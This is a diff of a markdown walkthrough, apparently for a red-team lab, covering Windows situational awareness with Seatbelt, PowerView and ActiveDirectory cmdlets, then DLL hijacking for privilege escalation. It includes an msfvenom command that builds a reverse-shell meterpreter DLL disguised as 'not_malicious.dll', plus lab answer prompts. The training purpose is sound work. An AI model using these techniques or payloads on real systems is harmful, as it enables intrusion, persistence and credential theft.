@@ -2192,7 +2192,7 @@ When using PowerShell for offensive operations, you will need to play around wit
 
 **Read the above and enumerate PC-FILESRV01 using PowerShell.**
 
-## Post Exploitation That's not a cat that's a dawg
+## Post Exploitation -  That's not a cat that's a dawg
 
 Now that we have administrator access to the machine, we can follow our post-exploitation methodology and dump credentials. To aid us in dumping credentials, we will be using the infamous tool Mimikatz. We will also be utilizing Covenant to drop Mimikatz.\
 
@@ -2253,7 +2253,7 @@ We should now have a working method to dump credentials on the endpoint.
 
 **What is the domain user's password that we can dump on S-SRV01?**
 
-## Post Exploitation Good Intentions, Courtesy of Microsoft: Part II
+## Post Exploitation -  Good Intentions, Courtesy of Microsoft: Part II
 
 If cracking the hash fails, we always know that there is a backup when operating in Windows. Windows allows functionality to pass a hash to WinRM and RDP to enable authentication. This gives us as attackers an advantage, getting rid of the need to crack hashes. This attack is known as pass-the-hash.
 
@@ -2301,7 +2301,7 @@ If successfully authenticated, you should now have a working WinRM shell that yo
 
 **What is the hostname of the remote endpoint we can authenticate to?**
 
-## Post Exploitation Watson left her locker open
+## Post Exploitation - Watson left her locker open
 
 After landing on PC-FILESRV01 and attempting to perform situational awareness, you may notice that you get an error when executing applications. This is due to whitelist application controls set on the server. We will be covering what AppLocker is and how it can be bypassed within this task.\
 
@@ -2464,3 +2464,286 @@ This step of situational awareness can also be done before or after gaining root
 
 **What anti-virus product is employed on PC-FILESRV01?**
 
+## Situational Awareness -  SEATBELT CHECK!
+
+Now that we understand the system's detection measures and what we can and can't do in our attack surface, we can begin moving on to system enumeration. This type of enumeration can help us identify the endpoint's surface better and potential areas for privilege escalation. To allow us to enumerate the endpoint, we will again be utilizing Seatbelt.\
+
+
+As previously mentioned, Seatbelt is an enumeration tool that will perform many system checks and provide information on an endpoint. This time we will be using all of the modules that Seatbelt has to offer.
+
+Find a quick overview of some of the essential modules below.
+
+* `DotNet` Retrieves .NET version
+* `LocalGPOs` Finds local group policies applied to machine and local users
+* `LocalGroups` Lists non-empty local groups
+* `NetworkShares` Lists exposed network shares
+* `PowerShell` Retrieves PowerShell version and security settings
+* `Processes` Lists running processes
+* `TokenPrivileges` Lists enabled token privileges (SeDebug)
+* `CredEnum` Lists current user's saved credentials
+* `InterestingFiles` Interesting files matching patterns in user folder
+* `ScheduledTasks` Scheduled tasks not authored by Microsoft.
+
+Some of the above tasks will require privileges or a desktop session to run. Using Seatbelt for low privileged awareness uses the basic information you can get to identify the system surface.\
+
+
+These are not nearly all of the modules that Seatbelt has to offer. For more information about all of the modules Seatbelt offers, check out the GitHub readme, [https://github.com/GhostPack/Seatbelt#command-groups](https://github.com/GhostPack/Seatbelt#command-groups)
+
+Find syntax and an example of output below.
+
+Syntax: `.\Seatbelt.exe all`
+
+![](https://i.imgur.com/ZYWXGrg.png)\
+
+
+We can also run Seatbelt from Covenant using the Seatbelt module found below.\
+
+
+Module: `Seatbelt`
+
+You will notice that Seatbelt produces a large amount of output. It can be helpful to save this output to a file to comb through later. You will have to spend a little bit of time searching through the output to get all the information you need on the endpoint.
+
+For more information about Seatbelt, check out the Seatbelt GitHub page, [https://github.com/GhostPack/Seatbelt#table-of-contents](https://github.com/GhostPack/Seatbelt#table-of-contents).
+
+### Answer the questions
+
+**What CLR version is installed on PC-FILESRV01?**
+
+**What PowerShell version is installed on PC-FILESRV01?**
+
+**What Windows build is PC-FILESRV01 running on?**
+
+## Situational Awareness ALL THE POWER!
+
+Now that we understand detections and system surface on the endpoint, we can begin looking at the user and groups of the system. This step of situational awareness can allow us to find privileges and user connections for future horizontal movement or privilege escalation.\
+
+
+The first tool we will be looking at is PowerView, [https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon). This tool is no longer supported but is still considered a standard for enumeration. From the PowerSploit GitHub, "PowerView is a PowerShell tool to gain network situational awareness on Windows domains. It contains a set of pure-PowerShell replacements for various windows "net \*" commands, which utilize PowerShell AD hooks and underlying Win32 API functions to perform useful Windows domain functionality."\
+
+
+To use the script, we will first need to import it then run the commands that we want to enumerate the endpoint. Find syntax and a few essential commands you can use with PowerView.\
+
+
+Syntax: `Import-Module .\PowerView.ps1`
+
+We can now run all of the commands that PowerView offers. In this task, we will be focusing on enumerating the local user and group policy surface. In the next task, we will use native PowerShell to enumerate the active directory surface. Outlined below is a list of commands we will cover in this task.
+
+* `Get-NetLocalGroup`
+* `Get-NetLocalGroupMember`
+* `Get-NetLoggedon`
+* `Get-DomainGPO`
+* `Find-LocalAdminAccess`
+
+For a complete list of commands, check out the GitHub readme, [https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon#powerview](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon#powerview)\
+
+
+***
+
+The first PowerView command we will be looking at is `Get-NetLocalGroup`; this command will enumerate/list all groups present on a local machine/computer. Find the syntax and output for the command below.\
+
+
+Syntax: `Get-NetLocalGroup`
+
+<figure><img src="https://i.imgur.com/rOtpUMS.png" alt=""><figcaption></figcaption></figure>
+
+The second PowerView command we will be looking at is `Get-NetLocalGroupMember`; this command will enumerate/list all members of a local group such as users, computers, or service accounts. Find the syntax and output for the command below.
+
+Syntax: `Get-NetLocalGroupMember -Group <group>`
+
+<figure><img src="https://i.imgur.com/yTz4g0i.png" alt=""><figcaption></figcaption></figure>
+
+The third PowerView command we will be looking at is `Get-NetLoggedon`; this command will enumerate/list all users currently logged onto the local machine/computer. This can be useful to identify what user's not to take over or what users to target in phishing or other attacks depending on your team's methodology and/or goals. Find the syntax and output for the command below.\
+
+
+Syntax: `Get-NetLoggedon`
+
+<figure><img src="https://i.imgur.com/HLdiknL.png" alt=""><figcaption></figcaption></figure>
+
+The fourth PowerView command we will be looking at is `Get-DomainGPO`; this command will enumerate/list the active directory domain GPOs installed on the local machine. This can be useful in identifying utilities like AppLocker or other remote services running on the machine/computer. Find the syntax and output for the command below.\
+
+
+Syntax: `Get-DomainGPO`
+
+<figure><img src="https://i.imgur.com/GsBGwf9.png" alt=""><figcaption></figcaption></figure>
+
+The final PowerView command we will be looking at is `Find-LocalAdminAccess`; this command will check all hosts connected to the domain a machine/computer is a part of and check if the current user or listed user is a local administrator. This can be helpful when targeting a specific user and attempting to move across the domain laterally. This can be used as an alternative to other tools like CME for passing the hash. Find the syntax and output for the command below.\
+
+
+Syntax: `Find-LocalAdminAccess`
+
+<figure><img src="https://i.imgur.com/g2YtRHu.png" alt=""><figcaption></figcaption></figure>
+
+For a complete list of commands and cheat-sheets, check out the following resources,
+
+* [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
+* [https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon#powerview](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon#powerview)
+* [https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
+
+To run PowerView in Covenant, we can utilize `PowerShellImport` mentioned in Task 25.\
+
+
+As with most offensive tooling, Defender detects this script. You will need to follow the methodology given in Task 31-36 to execute this tool and evade detections.\
+
+
+### Answer the questions
+
+**Read the above and enumerate PC-FILESRV01 using PowerView.**
+
+## Situational Awareness - Import-Module PowerUpGreySkull.ps1
+
+In some instances, depending on detections and restrictions within the endpoint, you may not run tools like Seatbelt and PowerView. In this case, we can utilize offensive PowerShell commands to perform situational awareness. In addition, Powershell natively supports several modules and commands that we can use to gain situational awareness and enumerate the system/environment.\
+
+
+We will only be covering a small surface of what PowerShell is capable of. Look below for an outline of commands and modules we will cover in this task.
+
+* `Get-ScheduledTask`
+* `Get-ScheduledTaskInfo`
+* `whoami /priv`
+* `Get-ADGroup`
+* `Get-ADGroupMember`
+* `Get-ADPrincipalGroupMembership`
+
+You will notice that most of the modules are focused on active directory structure; this is because the active directory plug-in/modules give us a large amount of control designed for system administrators. The first two commands we will be looking at are aimed towards identifying misconfigurations we can abuse for privilege escalation.
+
+***
+
+The first PowerShell command we will be looking at is `Get-ScheduledTask`; as the command says it will list/enumerate all the scheduled tasks present on the system. To list all tasks, there are no parameters needed to pass to the command. Find syntax for the command below.
+
+Syntax: `Get-ScheduledTask`
+
+<figure><img src="https://i.imgur.com/WnnyiFo.png" alt=""><figcaption></figcaption></figure>
+
+You will notice that there is a large number of tasks present; this is because Windows operates at startup with a large number of tasks default on every Windows install. We can use filters and parameters to eliminate some of the unneeded tasks to focus on obscure tasks that we can abuse. Find syntax for filtering below.\
+
+
+Syntax: `Get-ScheduledTask -TaskPath "\Users\*"`
+
+<figure><img src="https://i.imgur.com/RLPeilx.png" alt=""><figcaption></figcaption></figure>
+
+You can experiment with parameters and inputs to get the most optimal output for system enumeration.\
+
+
+For more information about `Get-ScheduledTask`, check out the Microsoft docs, [https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask](https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask)\
+
+
+The second PowerShell command we will be looking at is `Get-ScheduledTaskInfo`; similar to Get-ScheduledTask, this command will list specific information on specified Tasks allowing the attacker to identify the task and how it could be exploited. Find syntax for the command below.
+
+Syntax: `Get-ScheduledTaskInfo -TaskName <Full Path>`
+
+![](https://i.imgur.com/Uep9xif.png)\
+
+
+For more information about Get-ScheduledTaskInfo, check out the Microsoft docs, [https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtaskinfo](https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtaskinfo)\
+
+
+The third command, `whomai /priv`; isn't specific to PowerShell, but can help us with privilege escalation enumeration, as there are many exploits available with misconfigured privileges. The `/priv` parameter will enumerate the _SE privileges_ of the current user. Find the command used and output below.\
+
+
+Command: `whoami /priv`
+
+![](https://i.imgur.com/2Sh2OlE.png)
+
+***
+
+The fourth PowerShell command we will be looking at is `Get-ADGroup`; this module, part of the active directory module package, will allow us to enumerate a user's groups or all groups within the domain. To get the most out of this command, we will already need to enumerate the users present on the machine. Since this command is part of the ActiveDirectory module, you will need first to import the module. Find the syntax for the command below.\
+
+
+Syntax: `Import-Module ActiveDirectory; Get-ADGroup`
+
+After running the command, you will be prompted with a CLI to apply filters to the command; we recommend filtering by the `samAccountName`. Find example usage for this filter below.\
+
+
+Syntax: `samAccountName -like "*"`
+
+<figure><img src="https://i.imgur.com/hzBe6IH.png" alt=""><figcaption></figcaption></figure>
+
+To get the most out of this command, you will need to play with the filters and parameters used to get the most efficient output to enumerate the critical information.\
+
+
+For more information about `Get-ADGroup`, check out the Microsoft docs, [https://docs.microsoft.com/en-us/powershell/module/addsadministration/get-adgroup](https://docs.microsoft.com/en-us/powershell/module/addsadministration/get-adgroup)\
+
+
+The fifth PowerShell command we will be looking at is `Get-ADGroupMember`; similar to `Get-ADGroup`, this command will list the members of an active directory group. Once you have enumerated groups present on the domain, this command can be helpful to identify specific users that you can target, whether it be for privilege escalation or lateral movement. Since this command is part of the _ActiveDirectory_ module, you will need first to import the module. Find the syntax for the command below.\
+
+
+Syntax: `Import-Module ActiveDirectory; Get-ADGroupMember`
+
+After running the command, you will be prompted with a CLI to specify the group(s) you want to enumerate. As previously stated, you can get the groups from the previous enumeration with `Get-ADGroup`.
+
+<figure><img src="https://i.imgur.com/1UwaNQf.png" alt=""><figcaption></figcaption></figure>
+
+For more information about Get-ADGroupMember, check out the Microsoft docs, [https://docs.microsoft.com/en-us/powershell/module/addsadministration/get-adgroupmember](https://docs.microsoft.com/en-us/powershell/module/addsadministration/get-adgroupmember)\
+
+
+The final PowerShell command we will be looking at is `Get-ADPrincipalGroupMembership`, similar to `Get-ADGroupMember`, this command will retrieve the groups a user, computer group, or service account is a member of. In order to get the most out of this command we will need to already have some targeted users enumerated using other commands like `Get-ADUser`. Since this command is part of the `ActiveDirectory` module you will need to first import the module. Find the syntax for the command below.
+
+The final PowerShell command we will be looking at is `Get-ADPrincipalGroupMembership`; similar to `Get-ADGroupMember`; this command will retrieve the groups a user, computer group, or service account is a member. To get the most out of this command, we will need to have enumerated target users using other commands like `Get-ADUser`. Since this command is part of the _ActiveDirectory_ module, you will need first to import the module. Find the syntax for the command below.\
+
+
+Syntax: `Import-Module ActiveDirectory; Get-ADPrincipalGroupMembership`
+
+After running the command, you will be prompted with a CLI to specify the user(s) you want to enumerate.
+
+<figure><img src="https://i.imgur.com/m1addqf.png" alt=""><figcaption></figcaption></figure>
+
+When using PowerShell for offensive operations, you will need to play around with the commands and modules to see what works for you and develop your methodology similar to working with other tools.
+
+### Answer the questions
+
+**Read the above and enumerate PC-FILESRV01 using PowerShell.**
+
+## Privilege Escalation WERE TAKING OVER THIS DLL!
+
+Now that we have performed all the enumeration and situational awareness, we can move on to privilege escalation. Looking through our enumeration steps, you may notice a unique application connected to a scheduled task on the endpoint. We can attempt a DLL hijack on this application to escalate privileges, then set up persistence on the endpoint.
+
+From the MITRE ATT\&CK framework, DLL Hijacking is defined as "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. [\[1\]](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order?redirectedfrom=MSDN) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution." The AT\&CK Technique ID is [T1574](https://attack.mitre.org/techniques/T1574/).\
+
+
+To utilize DLL Hijacking for privilege escalation, we will need to research the application and known vulnerabilities and DLLs and find a DLL not present on the system we have write access to.\
+
+
+DLL Hijacking can also be used for persistence, as we will see later in the next task. This process is much easier than the previous one as we can use process monitoring tools like ProcMon and ProcessHacker2 to monitor for DLLs and their locations that can take over. The DLL persistence works by running the DLL with the application every time the system restarts or our connection is interrupted. This can be an application we put onto the system or an application already present that we exploit.\
+
+
+Steps taken to perform DLL hijacking are outlined below.
+
+1. Identify vulnerable application and location
+2. Identify applications PID
+3. Identify vulnerable DLLs that can be hijacked
+4. Use MSFVenom or other payload creation tools to create a malicious DLL
+5. Replace the original DLL with the malicious DLL
+6. Profit
+
+To begin escalating privileges with DLL Hijacking, we need to identify an application and scheduled task that we can target; this is covered in the previous two tasks. Once we have identified our target, we can use the power of Google to search for potential vulnerable DLLs associated with the application as we can not use tools like ProcMon to make the process easier.\
+
+
+By googling, `<application> DLL Hijacking`, we can see several articles and blog posts that can lead us in the right direction and research the application for us.
+
+If there is not any research on the application available, say a proprietary application. You can attempt to download the application from the server or find an identical copy on the internet for download that will allow you to search for vulnerable DLLs on your local machine. If you decide to take this approach, skip to the next task and complete the steps with ProcMon before returning to this task and exploiting the vulnerable DLL.
+
+***
+
+Once you have identified a DLL to target, you can decide to create a malicious DLL in Metasploit or Covenant or even create one from scratch. Depending on the endpoint you land on, and detection/anti-virus measures in place will determine how you approach creating a malicious DLL.\
+
+
+The first method we will be looking at is using MSFVenom to generate a Metasploit DLL. Find the command used below.\
+
+
+Command used: `sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=53 -f dll -o not_malicious.dll`
+
+The second method we will be looking at will use the Covenant InstallUtil launcher to generate a DLL that we can download. To generate the DLL navigate to _Launchers > InstallUtil > Download_.\
+
+
+![](https://i.imgur.com/xqDQhKG.png)
+
+For both of the methods used, you will now need to rename the malicious DLL then transfer it to the target machine in the correct path. You can do this by using the python HTTP server, Updog, or the Covenant Host function.\
+
+
+Finally, execute the vulnerable application or wait for the scheduled task to trigger and watch your listener for incoming connections.\
+
+
+### **Answer the questions**
+
+**Read the above and exploit the application.**
+
+**What is the name of the vulnerable application found on PC-FILESRV01?**
